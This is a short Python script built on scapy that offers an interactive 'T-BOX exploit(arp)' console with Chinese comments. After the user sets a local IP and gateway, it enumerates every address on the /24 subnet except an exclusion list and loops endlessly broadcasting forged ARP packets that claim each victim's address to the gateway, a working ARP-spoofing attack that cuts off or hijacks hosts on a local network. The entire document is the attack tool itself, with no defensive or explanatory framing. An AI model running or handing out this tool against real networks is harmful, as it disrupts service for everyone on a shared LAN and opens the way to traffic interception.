from scapy.all import Ether,ARP,sendp
import threading
def ip_hz():
    ips = []
    for i in range(2,255):
        ips.append(i)
    return ips
def ips(ip_houzui,lhost,gateway,save_list):
    ips1 = []
    for i in ip_houzui:
        ip4 = gateway[:-1]
        ip3 = ip4 + str(i)
        ips1.append(ip3)
    ips1.remove(lhost)
    print(lhost)
    for save_ip in save_list:
        if save_ip in ips1:
            ips1.remove(save_ip)
        else:
            pass

    return ips1

def arpspoof(ip_list,gateway):
    while True:
        for rhost in ip_list:
            try:
                pkt = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=gateway,psrc=rhost)#构造包
                sendp(pkt)
            except:
                print('[-]失败')
                return False
        print('[-]send Ether/ARP ==> all user')
lhost = '0.0.0.0'
gateway = '0.0.0.0'
save_list = []


while True:
    cmd = input('T-BOX exploit(arp) >')
    if cmd == 'show options':
            print('                                                          ')
            print('----------name---------content------------present---------')
            print('       lhost      '+lhost+'             本机IP              ')
            print('       gateway     '+gateway+'             网关IP              ')
            print('       save_list   '+str(save_list)+'            不攻击的IP           ')
            print('----------------------------------------------------------------')

    elif cmd[:11] == 'set gateway':
        gateway = cmd[12:]
        print('[*]gateway ==> ' + gateway)

    elif cmd[:9] == 'set lhost':
        lhost = cmd[10:]
        print('[*]lhost ==> '+lhost)

    elif cmd[:13] == 'add save_list':
        ip = cmd[14:]
        if ip[:8] == '192.168.':
            save_list.append(cmd[14:])
            save = cmd[14:]
            print('[*]save_list add '+ save)
        else:
            print('[-] '+ip+' not IP')


    elif cmd[:16] == 'remove save_list':
        try:
            save_list.remove(cmd[17:])
            print('[*]save_list remove '+ save)
        except:
            pass
    elif cmd == 'back':
        pass
    
    elif cmd == '':
        pass
    
    elif cmd == 'run':
        if lhost == '0.0.0.0' or gateway == '0.0.0.0':
            print('[-]请设置本机IP以及网关')
        else:
            ip_houzui = ip_hz()
            ip_list = ips(ip_houzui=ip_houzui,lhost=lhost,gateway=gateway,save_list=save_list)
            print('[*]',ip_list)
            arpspoof(ip_list,gateway)
    else:
        print("[-]can't find command: " + cmd)
